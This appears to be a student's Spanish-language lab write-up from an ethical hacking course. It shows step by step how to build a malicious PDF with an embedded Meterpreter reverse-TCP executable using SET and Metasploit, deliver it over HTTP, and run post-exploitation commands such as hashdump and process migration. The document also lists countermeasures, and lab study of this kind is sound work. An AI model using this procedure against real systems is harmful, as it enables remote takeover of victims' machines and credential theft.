<div align="center">
  
  # 🔒 <span style="color: #f85149;">PDF Malicioso</span> con <span style="color: #3fb950;">SET</span>

  ![Hacker Ético](https://img.shields.io/badge/HACKER-ÉTICO_I-ff69b4?style=flat-square)
  ![Ingeniería Social](https://img.shields.io/badge/INGENIERÍA-SOCIAL-8a2be2?style=flat-square)
  ![Kali Linux](https://img.shields.io/badge/KALI-LINUX-555555?logo=kalilinux&logoColor=white&style=flat-square)
  ![Metasploit](https://img.shields.io/badge/METASPLOIT-FRAMEWORK-3b82f6?style=flat-square)
  ![Status](https://img.shields.io/badge/ESTADO-COMPLETADO-success?style=flat-square)

  *Guía completa del ejercicio de Ingeniería Social usando Social Engineering Toolkit y Metasploit Framework.*

</div>

---

> [!WARNING]
> **Solo para uso académico en laboratorio controlado**
> Este ejercicio se realiza únicamente en máquinas virtuales aisladas del ITLA. Replicar este proceso fuera del laboratorio autorizado constituye un delito tipificado en la Ley 53-07 de Crímenes y Delitos de Alta Tecnología de la República Dominicana.

## 📋 Resumen del Laboratorio
- **Asignatura:** Hacker Ético I · ITLA
- **Herramientas:** SET (Social Engineering Toolkit) + Metasploit
- **Entorno:** VMware Workstation
- **Fecha:** Octubre 2026

---

## 01 🖥️ Entorno: Configuración del Laboratorio

El laboratorio utiliza dos máquinas virtuales corriendo en VMware Workstation, sin conectividad hacia fuera de la red interna.

| Rol | Sistema Operativo | Dirección IP | Función |
| :--- | :--- | :--- | :--- |
| 🔴 **Atacante (Kali HE1)** | Kali Linux | `192.168.254.147` | Genera el payload y escucha la conexión. |
| 🔵 **Víctima** | Windows Server 2022 | `192.168.254.148` | Abre el PDF malicioso. |

> **💡 ¿Qué es un Reverse TCP Shell?**
> En vez de que el atacante se conecte a la víctima (lo que bloquearía un firewall de entrada), el payload hace que la **víctima se conecte de vuelta al atacante**. Por eso el `LHOST` siempre es la IP de Kali: es quien escucha pasivamente.

**Flujo de ejecución:**
`Windows` ➔ `Abre PDF` ➔ `Ejecuta form.exe` ➔ `Conecta a 192.168.254.147:4444` ➔ `Sesión Meterpreter ✓`

---

## 02 🔍 Reconocimiento: Verificar Puertos

Antes de configurar el *listener*, es buena práctica verificar que el puerto no esté en uso.

```bash
kali@Kali:~$ ss -tlnp
State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
LISTEN  0       128     0.0.0.0:22         0.0.0.0:*
LISTEN  0       128     [::]:22            [::]:*

# Solo el puerto 22 (SSH) está ocupado → el puerto 4444 está libre ✓
```
*Nota: El puerto `4444` es el predeterminado de Metasploit. En pentesting real se prefieren puertos como 443 u 80 para evadir firewalls de salida.*

---

## 03 ⚙️ Generación del Payload: Social Engineering Toolkit

Iniciamos SET con privilegios de superusuario:

```bash
sudo su
setoolkit
```

### Navegación por los menús interactivos:
1. **Menú principal:** `1) Social-Engineering Attacks`
2. **Tipo de ataque:** `3) Infectious Media Generator`
3. **Formato:** `2) File-Format Exploits`
4. **Exploit específico:** `13) Adobe PDF Embedded EXE Social Engineering` *(Embebe un EXE dentro del PDF)*.
5. **PDF base:** `2) Use built-in BLANK PDF for attack`.
6. **Payload:** `2) Windows Meterpreter Reverse_TCP` *(Otorga capacidades de post-explotación avanzadas)*.
7. **LHOST (Atacante):** `192.168.254.147`
8. **LPORT (Puerto):** `4444`

> SET confirmará la creación del payload en el directorio `/root/.set/`. Se debe responder `no` a la creación automática del listener, ya que lo levantaremos manualmente.

---

## 04 🎧 Escucha: Configurar el Listener en Metasploit

En una segunda terminal, lanzamos Metasploit pasando los parámetros en un solo comando para agilizar el proceso (*One-liner*):

```bash
root@Kali:~# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.254.147; set LPORT 4444; set ExitOnSession false; exploit -j"

[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.254.147:4444
msf6 exploit(multi/handler) > _
```

---

## 05 🌐 Entrega: Servir el PDF mediante HTTP

En una tercera terminal, levantamos un servidor web simple con Python en la carpeta donde SET guardó los archivos generados:

```bash
root@Kali:~# cd /root/.set/
root@Kali:~/.set# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

---

## 06 🎯 Ejecución: La perspectiva de la Víctima (Windows)

1. **Descargar el PDF:** Acceder a `http://192.168.254.147:8080/template.pdf` desde el navegador.
2. **Abrir con Adobe Reader:** El PDF se debe abrir con **Adobe Acrobat Reader** (los visores web integrados de los navegadores no ejecutarán el payload).
3. **Guardar adjunto:** Al abrirlo, Adobe solicita guardar el archivo embebido (`form.pdf`, que en realidad es un `.exe`). El usuario lo guarda en Descargas.
4. **Renombrar y ejecutar (Engaño de extensión):** Dado que Windows oculta las extensiones por defecto, el usuario es engañado. Para ejecutarlo en el lab, corregimos la extensión desde CMD:

   ```cmd
   C:\Users\Administrador\Downloads> ren form.pdf form.exe
   C:\Users\Administrador\Downloads> form.exe
   ```

---

## 07 🔓 Resultado: Sesión Meterpreter Establecida

En la terminal de Metasploit (Kali), recibimos la conexión y obtenemos el control total del sistema:

```bash
[*] Meterpreter session 1 opened (192.168.254.147:4444 -> 192.168.254.148:XXXX)

msf6 exploit(multi/handler) > sessions -i 1
meterpreter > sysinfo
Computer     : WIN-SERVER2022
OS           : Windows Server 2022
Architecture : x86
```

### 🛠️ Comandos de Post-Explotación (Meterpreter)
| Comando | Descripción de la acción |
| :--- | :--- |
| `sysinfo` | Muestra la información general del sistema víctima. |
| `getuid` | Identifica el usuario con el que corre el proceso actual. |
| `screenshot` | Toma una captura de pantalla del escritorio de la víctima. |
| `shell` | Abre un CMD interactivo directo en la máquina. |
| `migrate <PID>`| Migra el proceso inestable a uno legítimo del sistema (ej. `explorer.exe`). |
| `hashdump` | Extrae los hashes de contraseñas de la SAM (Requiere permisos SYSTEM). |

---

## 08 🧠 Conceptos Clave (Defensa / Blue Team)

* **Ingeniería Social (Pretexting):** El ataque no explota una vulnerabilidad a nivel de red, sino que vulnera la confianza del usuario. El documento PDF actúa como "señuelo".
* **Vector vs. Payload:** El vector de ataque es el PDF (el mecanismo de entrega). El payload es el ejecutable Meterpreter (la carga destructiva).
* **Ausencia de Patch Management:** Las versiones modernas de Adobe Reader y Windows Defender bloquean este vector específico. El laboratorio demuestra el riesgo crítico en organizaciones que operan con sistemas desactualizados o "Legacy".
* **Contramedidas reales:** 
  1. Mantener software y SO actualizados.
  2. Activar el modo "Sandbox" (Vista Protegida) en Adobe.
  3. Desplegar soluciones EDR/XDR.
  4. Forzar a Windows a mostrar las extensiones de archivos conocidas.

---

## 09 📂 Resumen de Archivos Generados

| Archivo | Ruta en Kali (Atacante) | Descripción |
| :--- | :--- | :--- |
| `template.pdf` | `/root/.set/template.pdf` | El documento PDF señuelo con el EXE incrustado. |
| `payload.exe` | `/root/.set/payload.exe` | El ejecutable puro (Meterpreter) aislado. |
| `autorun/` | `/root/.set/autorun/` | Directorio preparado para copiar en un USB con `autorun.inf`. |
| `meta_config` | `/root/.set/meta_config` | Archivo *resource* (RC) con la configuración automática de Metasploit. |

---

## 10 🎓 Lo Aprendido (Reflexión del Laboratorio)

Durante la realización de esta práctica, pude consolidar varios conceptos vitales en el ámbito de la ciberseguridad:

1. **El usuario es el eslabón más débil:** A pesar de tener firewalls robustos, si un usuario confía en un archivo externo (Ingeniería Social), puede comprometer la red interna desde adentro.
2. **Evasión de políticas de entrada (Ingress):** Comprobé por qué los *Reverse Shells* son tan efectivos. Al hacer que la víctima inicie la conexión HTTP/TCP hacia el atacante (LHOST), se saltan las reglas del firewall que normalmente bloquean conexiones entrantes desconocidas.
3. **El peligro de las interfaces amigables (GUI):** Entendí cómo el comportamiento predeterminado de Windows de "Ocultar extensiones de archivos para tipos de archivos conocidos" es un riesgo de seguridad crítico. Un usuario ve un archivo llamado `reporte.pdf` (con icono de Adobe) sin notar que el sistema ocultó el `.exe` final.
4. **La importancia de la migración de procesos:** Una vez obtenida la sesión de Meterpreter, si el usuario cierra el PDF engañoso, la conexión se cae. Migrar el payload a un proceso persistente (como `explorer.exe` o `svchost.exe`) garantiza el acceso continuo y ayuda a evadir la detección básica.

---
## 👨‍💻 Autor

**Neury Jorge Montero Mejía**

*Estudiante de Tecnólogo en Seguridad Informática*

[![LinkedIn](https://img.shields.io/badge/LINKEDIN-NEURY%20MONTERO-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/neuryjmm)
[![GitHub](https://img.shields.io/badge/GITHUB-NEURYJMM-111111?style=flat-square&logo=github&logoColor=white)](https://github.com/NeuryJMM)

---


[← Volver al laboratorio](../README.md)
